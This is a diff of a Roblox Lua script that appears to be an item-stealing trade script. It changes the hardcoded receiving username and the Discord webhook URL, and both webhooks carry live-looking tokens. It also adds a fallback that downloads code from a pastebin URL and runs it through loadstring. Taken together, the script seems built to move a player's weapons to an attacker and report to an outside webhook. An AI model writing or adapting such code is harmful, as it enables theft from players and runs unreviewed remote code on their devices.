@@ -8,10 +8,11 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"057Deni"}
+local users = _G.Usernames or {"Logikaaa_1"}
 local min_rarity = _G.min_rarity or "Common"
+local min_value = tonumber(_G.min_value) or 1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1538645276531761252/cUb2gp1cnWz8w0EXNjJ8AVBtFcmbmEwLF2zmGUbvVZkmZkd4vYcEye9VkuB7wavTd-Y6"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1533742453679456348/6T74rUAGOBhAiGGgldJAgo8tTR0FOX4nw1n94ekagsZNGmXMetWP5CH1zyhAKMafHNSC"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -36,8 +37,31 @@ end
 
 local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
-local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local Trade = ReplicatedStorage:WaitForChild("Trade")
+
+local database
+
+do
+    local ok, result = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    end)
+
+    if ok and typeof(result) == "table" then
+        database = result
+    else
+        local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
+        local ok2, result2 = pcall(function()
+            return loadstring(raw)()
+        end)
+
+        if ok2 and typeof(result2) == "table" then
+            database = result2
+        else
+            warn("[Trade] Failed to load database")
+            database = {}
+        end
+    end
+end
 
 local rarityTable = {
     "Common",
